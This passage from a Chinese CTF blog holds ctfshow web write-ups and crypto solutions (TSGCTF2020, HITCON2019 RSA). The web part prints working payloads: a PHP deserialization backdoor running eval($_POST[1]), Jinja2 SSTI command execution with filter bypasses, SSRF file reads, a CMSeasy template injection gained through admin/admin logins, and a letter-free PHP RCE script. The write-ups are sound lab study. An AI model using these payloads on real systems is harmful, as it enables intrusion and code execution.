class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>传这种后门后续操作方便点</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>题目多加了一个过滤限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看视频学到可以在O后面的数字前面加上’+’来绕过这个匹配</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxy&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVip&quot;</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:+<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;echo system(&#x27;cat f*&#x27;);&quot;</span>;&#125;;&#125;</span><br></pre></td></tr></table></figure><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="web310"><a href="#web310" class="headerlink" title="web310"></a>web310</h2><p>漏洞点在index.php的这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$service</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;service&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$service</span>)&#123;</span><br><span class="line">    <span class="variable">$lastVersion</span>=<span class="variable">$service</span>-&gt;<span class="title function_ invoke__">checkVersion</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/web-CTFshow/images/image-3.png" alt="img"></p><p><img src="/web-CTFshow/images/image-4.png" alt="img"></p><p><img src="/web-CTFshow/images/image-5.png" alt="img"><br>这里curl_exec可以用来文件读取</p><p>读取 <code>/etc/nginx/nginx.conf</code> …</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$update_url</span> = <span class="string">&quot;file:///etc/nginx/nginx.conf&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="keyword">new</span> <span class="title function_ invoke__">config</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">dao</span>()));</span><br></pre></td></tr></table></figure><p><img src="/web-CTFshow/images/image-1.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       4476;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        root         /var/flag;</span><br><span class="line">        index index.html;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问4476端口<br><code>public  $update_url = &quot;http://127.0.0.1:4476&quot;;</code><br><img src="/web-CTFshow/images/image-2.png" alt="img"></p><h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><p>学习资料:</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/109561271?ops_request_misc=%7B%22request_id%22:%22170766650916800226518572%22,%22scm%22:%2220140713.130102334.pc_blog.%22%7D&request_id=170766650916800226518572&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-6-109561271-null-null.nonecase&utm_term=ssti&spm=1018.2226.3001.4450">.&gt;?</a></p><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>无过滤 可以sstimap一把梭</p><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p><code>?name=&#123;&#123;""["__cla"+"ss__"]["__ba"+"se__"]["__subc"+"lasses__"]()&#125;&#125;</code> 查看可用类</p><p>常规利用 <code>os._wrap_close</code> 发现过不去… 看wp说是过滤了数字2,3??? </p><p>fuzz测试一下发现确实…</p><p>继续查找 发现可以用 <code>warnings.catch_warnings</code></p><p>payload </p><p><code>?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")&#125;&#125;</code></p><p>成功回显root</p><p>加强一点就这么拼接</p><p><code>&#123;&#123;()["__cla"+"ss__"]["__ba"+"ses__"][0]["__su"+"bcl"+"asses__"]()[169]["__in"+"it__"]["__glo"+"bals__"]["__buil"+"tins__"]['ev'+'al']("__impo"+"rt__('os').pop"+"en('ls /').read()")&#125;&#125;</code></p><p>看wp 过滤的132可以用140-8 这些算术表达式来绕 学到了</p><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>fuzz一下 貌似引号被过滤了… 但关键字没有被过滤</p><p>跟着wp学到一个思路 <code>os._wrap_close</code> 可以利用requests传参!!!</p><p>这样就把参数逃逸了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;a=popen&amp;b=ls</span><br></pre></td></tr></table></figure><p>要注意 <code>os._wrap_close</code>和<code>warnings.catch_warnings</code> 用法的区别!</p><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h2 id="web477"><a href="#web477" class="headerlink" title="web477"></a>web477</h2><p>参考:<br><a href="https://blog.csdn.net/m0_60988110/article/details/122601605">+</a></p><p>cmseasy框架 存在RCE漏洞<br>dirsearch扫着一堆error… 访问&#x2F;admin 经典弱口令 admin admin登陆后台<br>在模板-手机自定义标签<br>发现js调用 可用闭合前面引号括号来命令执行<br>尝试没能写入shell… 只能看phpinfo()…<br>构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">233</span><span class="string">&quot;&#125;;&lt;?=phpinfo();?&gt;/*</span></span><br></pre></td></tr></table></figure><p>不确定注入点 都填这个 生成后预览访问 环境变量得到FLAG</p><h2 id="web478"><a href="#web478" class="headerlink" title="web478"></a>web478</h2><h1 id="常用姿势"><a href="#常用姿势" class="headerlink" title="常用姿势"></a>常用姿势</h1><h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p>考点: flask算pin<br>然而直接 <code>/file?filename=/flag</code>就读到了…</p><h2 id="web802"><a href="#web802" class="headerlink" title="web802"></a>web802</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无数字字母RCE<br><a href="https://blog.csdn.net/miuzzx/article/details/109143413">这篇</a><br>用上传临时文件:<br><img src="/web-CTFshow/images/image.png" alt="img"><br>确实精妙</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><p>当然这里直接传xor即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-Other</title>
      <link href="/Crypto-Other/"/>
      <url>/Crypto-Other/</url>
      
        <content type="html"><![CDATA[<p>一些杂题(密码)&#x2F; 比赛的密码题</p><span id="more"></span><h1 id="tsgctf2020"><a href="#tsgctf2020" class="headerlink" title="tsgctf2020"></a>tsgctf2020</h1><h2 id="beginners-crypto"><a href="#beginners-crypto" class="headerlink" title="beginners_crypto"></a>beginners_crypto</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()) &lt;= <span class="number">50</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">str</span>(<span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>) &lt;&lt; <span class="number">10000</span>).endswith(<span class="string">&#x27;1002773875431658367671665822006771085816631054109509173556585546508965236428620487083647585179992085437922318783218149808537210712780660412301729655917441546549321914516504576&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>搁着开始没搞懂题目意思…<br>这其实就等价于 给出 <code>m*2**10000 = s (mod 10**175)</code>…<br>由于不互素 不能直接将逆元乘过去<br>两种方法:</p><h3 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h3><p>观察他们的gcd发现可以全部除掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x =  (<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">10000</span>,<span class="number">10</span>**<span class="number">175</span>))</span><br><span class="line">n = <span class="number">10</span>**<span class="number">175</span></span><br><span class="line"><span class="built_in">print</span>(gcd(x,n))</span><br><span class="line"><span class="built_in">print</span>(gcd(s,n))</span><br><span class="line">GCD = gcd(s,n)</span><br><span class="line">s //= GCD</span><br><span class="line">x //= GCD</span><br><span class="line">n //= GCD</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">m = modinv(x,n)*s%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><h3 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h3><p>可以改变模数 比如<code>10**175 -&gt; 5**175</code>这种<br>也就是选择新模数为原来模数的因子 且满足大于m的比特数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">5</span>**<span class="number">175</span></span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">m = modinv(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">10000</span>,n),n)*s%n</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p>flag: TSGCTF{0K4y_Y0U_are_r3aDy_t0_Go_aNd_dO_M0r3_CryPt}</p><h2 id="modulus-amittendus"><a href="#modulus-amittendus" class="headerlink" title="modulus_amittendus"></a>modulus_amittendus</h2><p>题目给的是rugby代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;openssl&#x27;</span><br><span class="line">require &#x27;json&#x27;</span><br><span class="line"></span><br><span class="line">def modinv(a, m)</span><br><span class="line">  m0, inv, x0 = m, 1, 0</span><br><span class="line">  while a &gt; 1</span><br><span class="line">    inv -= (a / m) * x0</span><br><span class="line">    a, m = m, a % m</span><br><span class="line">    inv, x0 = x0, inv</span><br><span class="line">  end</span><br><span class="line">  inv += m0 if inv &lt; 0</span><br><span class="line">  inv</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">class RSA</span><br><span class="line">  def initialize</span><br><span class="line">    @p = OpenSSL::BN::generate_prime(1024, true).to_i</span><br><span class="line">    @q = OpenSSL::BN::generate_prime(1024, true).to_i</span><br><span class="line">    @n = @p * @q</span><br><span class="line">    @e = 65537</span><br><span class="line">    @d = modinv(@e, (@p - 1) * (@q - 1))</span><br><span class="line">    @exp1 = @d % (@p - 1)</span><br><span class="line">    @exp2 = @d % (@q - 1)</span><br><span class="line">    @cf = modinv(@q, @p)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def encrypt(m)</span><br><span class="line">    m.pow(@e, @n)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def decrypt(c)</span><br><span class="line">    m1 = c.pow(@exp1, @p)</span><br><span class="line">    m2 = c.pow(@exp2, @q)</span><br><span class="line">    (m2 + @cf * (m1 - m2) % @p * @q) % @n</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def pubkey</span><br><span class="line">    privkey.to_a[..2].to_h</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def privkey</span><br><span class="line">    &#123;</span><br><span class="line">      e: @e,</span><br><span class="line">      n: @d,</span><br><span class="line">      cf: @cf,</span><br><span class="line">      p: @p,</span><br><span class="line">      q: @q,</span><br><span class="line">      exp1: @exp1,</span><br><span class="line">      exp2: @exp2,</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">flag = File.read(&#x27;flag.txt&#x27;).unpack(&quot;H*&quot;)[0].hex</span><br><span class="line">rsa = RSA.new</span><br><span class="line">p rsa.encrypt(flag)</span><br><span class="line"></span><br><span class="line">File.write(&#x27;pubkey.json&#x27;, JSON.dump(rsa.pubkey))</span><br></pre></td></tr></table></figure><p>题目给了 d,e,c,modinv(q,p)要求m<br>没什么思路 瞄一眼WP 说是模仿的 HITCON2019LostModuleAgain 确实跟<a href="https://github.com/pcw109550/write-up/blob/master/2019/HITCON/Lost_Modulus_Again/README.md">原题</a>一模一样 </p><p>只是原题给了 modinv(p,q)和modinv(q,p)这里只给了一个?<br>干脆复现原题吧</p><h2 id="Sweet-like-Apple-Pie"><a href="#Sweet-like-Apple-Pie" class="headerlink" title="Sweet like Apple Pie"></a>Sweet like Apple Pie</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line">getcontext().prec = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>():</span><br><span class="line">    lasts, t, s, n, na, d, da = <span class="number">0</span>, Decimal(<span class="number">3</span>), <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span></span><br><span class="line">    <span class="keyword">while</span> s != lasts:</span><br><span class="line">        lasts = s</span><br><span class="line">        n, na = n + na, na + <span class="number">8</span></span><br><span class="line">        d, da = d + da, da + <span class="number">32</span></span><br><span class="line">        t = (t * n) / d</span><br><span class="line">        s += t</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sin</span>(<span class="params">x</span>):</span><br><span class="line">    x = Decimal(x) % pi()</span><br><span class="line">    p, factor = <span class="number">0</span>, x</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">        p += factor</span><br><span class="line">        factor *= - (x ** <span class="number">2</span>) / ((<span class="number">2</span> * n + <span class="number">2</span>) * (<span class="number">2</span> * n + <span class="number">3</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read(), byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(flag &lt; <span class="number">2</span> ** <span class="number">500</span>)</span><br><span class="line"><span class="built_in">print</span>(sin(flag))</span><br></pre></td></tr></table></figure><p>output.txt</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.162452474092990408037062573408259688253995107643493293584426591003988903469791005222132158897198623144937279539555347413553688190959907095952250683633029959235933436782707275021817801890433801800730214807785288112267446678747104887584191096749196212784470161670299495426679759221652356130008110761143</span><br></pre></td></tr></table></figure><p>??? 完全不会… 这能还原?<br>只能看题解了<br><a href="https://ctftime.org/writeup/22580">https://ctftime.org/writeup/22580</a></p><p>orz<br>题解思路大致学到了 代码实现还有点小问题(题解的solve也跑不出来啊…O0o?)</p><h1 id="HITCON2019"><a href="#HITCON2019" class="headerlink" title="HITCON2019"></a>HITCON2019</h1><h2 id="Lost-Modulus-Again"><a href="#Lost-Modulus-Again" class="headerlink" title="Lost Modulus Again"></a>Lost Modulus Again</h2><p>题目就不贴了 就是RSA 已知e,d,modinv(p,q),modinv(q,p)求m<br>数据:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Key([e = <span class="number">1048583</span>, n = <span class="number">20899585599499852848600179189763086698516108548228367107221738096450499101070075492197700491683249172909869748620431162381087017866603003080844372390109407618883775889949113518883655204495367156356586733638609604914325927159037673858380872827051492954190012228501796895529660404878822550757780926433386946425164501187561418082866346427628551763297010068329425460680225523270632454412376673863754258135691783420342075219153761633410012733450586771838248239221434791288928709490210661095249658730871114233033907339401132548352479119599592161475582267434069666373923164546185334225821332964035123667137917080001159691927</span>, x = <span class="number">22886390627173202444468626406642274959028635116543626995297684671305848436910064602418012808595951325519844918478912090039470530649857775854959462500919029371215000179065185673136642143061689849338228110909931445119687113803523924040922470616407096745128917352037282612768345609735657018628096338779732460743</span>, y = <span class="number">138356012157150927033117814862941924437637775040379746970778376921933744927520585574595823734209547857047013402623714044512594300691782086053475259157899010363944831564630625623351267412232071416191142966170634950729938561841853176635423819365023039470901382901261884795304947251115006930995163847675576699331</span>])</span><br><span class="line">c = <span class="number">0x32074de818f2feeb788e36d7d3ee09f0000381584a72b2fba0dcc9a2ebe5fd79cf2d6fd40c4dbfea27d3489704f2c1a30b17a783baa67229d02043c5bc9bdb995ae984d80a96bd79370ea2c356f39f85a12d16983598c1fb772f9183441fea5dfeb5b26455df75de18ce70a6a9e9dbc0a4ca434ba94cf4d1e5347395cf7aafa756c8a5bd6fd166bc30245a4bded28f5baac38d024042a166369f7515e8b0c479a1965b5988b350064648738f6585c0a0d1463bd536d11a105bb926b44236593b5c6c71ef5b132cd9c211e8ad9131aa53ffde88f5b0df18e7c45bcdb6244edcaa8d386196d25297c259fca3be37f0f2015f40cb5423a918c51383390dfd5a8703</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不得不说出的真的很好<br>脚本套多了真的会忽略这些大小估计 整除关系 转化方程… 这些思想在这道题体现的很充分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">q*x = 1+k1*p</span><br><span class="line">p*y = 1+k2*q</span><br><span class="line">=&gt; q*(x+k2) = p*(y+k1)</span><br><span class="line">notice that x&lt;p y&lt;q k1&lt;q k2&lt;p</span><br><span class="line">and p,q are coprime</span><br><span class="line">=&gt; q|(y+k1) &amp; 0&lt;y+k1&lt;2q =&gt; y+k1=q</span><br><span class="line">the same as p =&gt; x+k2=p</span><br><span class="line">suprisingly, we actually have k1*k2+1=x*y   </span><br><span class="line">soshite</span><br><span class="line">=&gt; phi = (p-1)*(q-1)</span><br><span class="line">       = (x+k2-1)*(y+k1-1)</span><br><span class="line">       = (x-1)*(y-1)+k1*(x-1)+k2*(y-1)+k1*k2</span><br><span class="line"></span><br><span class="line">use the equal k1*k2+1=x*y above</span><br><span class="line">=&gt; (x-1)*k1**2+(x*y-1-phi+(x-1)*(y-1))*k1+(y-1)*(x*y-1)=0</span><br><span class="line">这样代入phi的所有可能值求解一个关于k1的二次方程 利用k1为整数的限制就能得到phi</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">1048583</span></span><br><span class="line">d = <span class="number">20899585599499852848600179189763086698516108548228367107221738096450499101070075492197700491683249172909869748620431162381087017866603003080844372390109407618883775889949113518883655204495367156356586733638609604914325927159037673858380872827051492954190012228501796895529660404878822550757780926433386946425164501187561418082866346427628551763297010068329425460680225523270632454412376673863754258135691783420342075219153761633410012733450586771838248239221434791288928709490210661095249658730871114233033907339401132548352479119599592161475582267434069666373923164546185334225821332964035123667137917080001159691927</span></span><br><span class="line">x = <span class="number">22886390627173202444468626406642274959028635116543626995297684671305848436910064602418012808595951325519844918478912090039470530649857775854959462500919029371215000179065185673136642143061689849338228110909931445119687113803523924040922470616407096745128917352037282612768345609735657018628096338779732460743</span></span><br><span class="line">y = <span class="number">138356012157150927033117814862941924437637775040379746970778376921933744927520585574595823734209547857047013402623714044512594300691782086053475259157899010363944831564630625623351267412232071416191142966170634950729938561841853176635423819365023039470901382901261884795304947251115006930995163847675576699331</span></span><br><span class="line">c = <span class="number">0x32074de818f2feeb788e36d7d3ee09f0000381584a72b2fba0dcc9a2ebe5fd79cf2d6fd40c4dbfea27d3489704f2c1a30b17a783baa67229d02043c5bc9bdb995ae984d80a96bd79370ea2c356f39f85a12d16983598c1fb772f9183441fea5dfeb5b26455df75de18ce70a6a9e9dbc0a4ca434ba94cf4d1e5347395cf7aafa756c8a5bd6fd166bc30245a4bded28f5baac38d024042a166369f7515e8b0c479a1965b5988b350064648738f6585c0a0d1463bd536d11a105bb926b44236593b5c6c71ef5b132cd9c211e8ad9131aa53ffde88f5b0df18e7c45bcdb6244edcaa8d386196d25297c259fca3be37f0f2015f40cb5423a918c51383390dfd5a8703</span></span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot,gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># First to calculate possible phis</span></span><br><span class="line">phis = []</span><br><span class="line">kphi = d*e-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span 